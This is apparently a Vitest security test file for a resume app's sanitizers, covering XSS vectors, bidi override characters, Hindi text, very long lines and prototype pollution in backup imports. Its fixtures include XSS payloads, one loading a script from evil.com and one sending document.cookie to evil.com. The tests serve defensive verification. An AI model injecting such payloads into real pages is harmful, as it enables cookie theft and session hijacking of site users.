import { describe, it, expect } from 'vitest';
import { sanitizeUrl, stripUnsafeChars, splitIntoSegments } from '../../src/lib/safe';
import { sanitizeFilename } from '../../src/lib/safeUtils';
import { validateBackupFile, computeBackupChecksum } from '../../src/lib/backup';

describe('C11.6: Hostile Input Security Verification', () => {
  describe('XSS Vectors & Dangerous Schemes', () => {
    const payloads = [
      '<script>alert("xss")</script>',
      '<img src="x" onerror="alert(1)" />',
      '"><script src="https://evil.com/payload.js"></script>',
      'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
      'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
      'vbscript:msgbox("xss")',
      'jav&#x09;ascript:alert(1)',
      'java\u0000script:alert(1)',
    ];

    it('sanitizes all dangerous link schemes to null', () => {
      for (const payload of payloads) {
        const sanitized = sanitizeUrl(payload);
        expect(sanitized).toBeNull();
      }
    });

    it('splitIntoSegments renders hostile script tags as inert text segments', () => {
      const hostileText = 'Experience: <script>fetch("http://evil.com?c=" + document.cookie)</script> and <img onerror=alert(1)>';
      const spans = [{ id: 's1', start: 12, end: 72 }];
      const segments = splitIntoSegments(hostileText, spans);

      // Reconstructed text must exactly match raw text without executing
      const joined = segments.map((s) => s.text).join('');
      expect(joined).toBe(hostileText);

      // Confirm segments are structured data, not executable HTML
      expect(Array.isArray(segments)).toBe(true);
      expect(segments.every((s) => typeof s.text === 'string')).toBe(true);
    });
  });

  describe('Hostile Formatting, Bidi Overrides & Non-Latin Scripts', () => {
    it('strips RTL/bidi overrides, control bytes, and zero-width spaces', () => {
      // Bidi override attack: \u202E flips text rendering
      const bidiPayload = 'Resume \u202E reversed \u202D text \u0000 null byte \uFEFF BOM';
      const cleaned = stripUnsafeChars(bidiPayload);

      expect(cleaned).not.toContain('\u202E');
      expect(cleaned).not.toContain('\u202D');
      expect(cleaned).not.toContain('\u0000');
      expect(cleaned).not.toContain('\uFEFF');
      expect(cleaned).toBe('Resume  reversed  text  null byte  BOM');
    });

    it('safely handles Devanagari script, Hindi text, and emojis without crashing or corruption', () => {
      const devanagariText = 'नमस्ते, मैं एक सॉफ्टवेयर इंजीनियर हूँ (B.Tech CSE fresher 🚀 2026)';
      const cleaned = stripUnsafeChars(devanagariText);
      expect(cleaned).toBe(devanagariText);

      const segments = splitIntoSegments(devanagariText, [{ id: 'dev1', start: 0, end: 6 }]);
      expect(segments[0].text).toBe('नमस्ते');
    });

    it('handles extremely long lines (1 MB) gracefully without call stack overflow', () => {
      const hugeLine = 'A'.repeat(1024 * 1024); // 1 MB line
      expect(() => {
        const cleaned = stripUnsafeChars(hugeLine);
        expect(cleaned.length).toBe(1024 * 1024);
      }).not.toThrow();

      expect(() => {
        const filename = sanitizeFilename(hugeLine);
        expect(filename.length).toBeLessThanOrEqual(80);
      }).not.toThrow();
    });
  });

  describe('Prototype Pollution Defense', () => {
    it('blocks prototype pollution keys (__proto__, constructor, prototype) in imported backup data', () => {
      const maliciousJson = JSON.stringify({
        app: 'hireflow',
        backupVersion: 1,
        exportedAt: '2026-10-19T06:00:00.000Z',
        engineVersion: '4.0.0',
        __proto__: { polluted: true },
        sections: {},
        checksum: computeBackupChecksum({}),
      });

      const validation = validateBackupFile(maliciousJson);
      expect(validation.valid).toBe(true);

      // Verify Object prototype is not polluted
      expect((Object.prototype as any).polluted).toBeUndefined();
    });
  });
});
